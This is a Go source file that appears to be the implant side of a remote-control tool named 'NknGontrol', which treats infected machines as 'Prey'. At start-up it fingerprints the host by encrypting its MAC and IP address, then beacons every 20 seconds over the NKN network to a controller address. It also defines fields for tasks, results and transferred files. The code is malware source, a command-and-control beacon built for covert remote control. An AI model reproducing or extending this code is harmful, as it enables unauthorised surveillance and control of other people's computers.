package main

import (
	"NknGontrol/module"
	"NknGontrol/module/cipher"
	"NknGontrol/module/getmac"
	"NknGontrol/module/nkntransfer"
	"encoding/base64"
	"time"
)

const (
	shadowTrap = "xxxxxxxxxxxx"
	Aeskey     = "xxxxxxx"

	heartBeatTime = 20
	TransThreads  = 4
)

type PreyStat struct {
	Status  int    `json:"status"` 	Task    string `json:"task"`
	Result  string `json:"result"`
	FileHex string `json:"filehex"`
	FileLo  string `json:"filelo"`
}

type InitPrey struct {
	UDID string
}

var PreyInfo InitPrey

func init() {

	PreyInfo.UDID = MakeClientName()
	go HeartBeat()

}

func HeartBeat() {
	for {
		nkntransfer.Sender(PreyInfo.UDID, shadowTrap, "")
		time.Sleep(heartBeatTime * time.Second)
	}
}

func MakeClientName() string {
	macipbyte, _ := cipher.AesCbcEncrypt([]byte(getmac.GetMacAddrs()[0]+getmac.GetIPs()[0]), []byte(module.AesKey))
	return base64.StdEncoding.EncodeToString(macipbyte)
}
